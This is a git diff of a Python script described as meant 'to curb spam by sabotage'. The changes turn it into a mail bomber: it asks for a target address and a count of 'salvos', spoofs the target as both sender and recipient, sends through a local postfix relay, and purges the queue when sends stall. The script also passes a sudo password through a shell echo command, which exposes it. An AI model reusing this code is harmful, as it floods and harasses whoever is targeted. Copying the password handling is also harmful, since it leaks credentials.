@@ -7,13 +7,16 @@ import subprocess as sp
 from dotenv import load_dotenv
 
 #Programmer: Mario Martinez
-#date: 01/21/2022
+#date: 01/25/2022
 #Purpose: To curb spam by sabotage
 
 load_dotenv() 	#You will need to create a .env file with 
 				#export USER="username"
 				#export PASSWORD="password"
 password = os.environ.get('PASSWORD')
+
+target = input('Enter target address: ')
+reps = int(input('Enter how many salvos: '))
 
 #start local mail relay
 os.system('echo ' + password + ' | sudo -S postfix start')
@@ -22,10 +25,10 @@ print()
 #set up variables
 textfile = 'messages.dat'
 mailServer = 'localhost'
-sender = 'lmpanzo87@gmail.com'
-recipient = 'lmpanzo87@gmail.com'
+sender = target
+recipient = target
 messageTitle = 'In my room now!'
-numOfMessages = 1
+numOfMessages = reps
 
 text = open('messages.dat', 'r')
 messages = text.readlines()
@@ -61,6 +64,10 @@ while(sp.getoutput('mailq') != 'Mail queue is empty'):
 	print('Waiting for queue to empty', timeElapsed, 'seconds elapsed.')
 	time.sleep(1)
 	timeElapsed += 1
+	if (timeElapsed > numOfMessages):
+		if ((str(numOfMessages) + ' Requests.') in sp.getoutput('mailq')):
+			os.system('sudo postsuper -d ALL')
+			print('Cancelled send, email rejected, or MX not sending.\nCache is clear.')
 
 print('Closing postfix')
 os.system('sudo postfix stop')
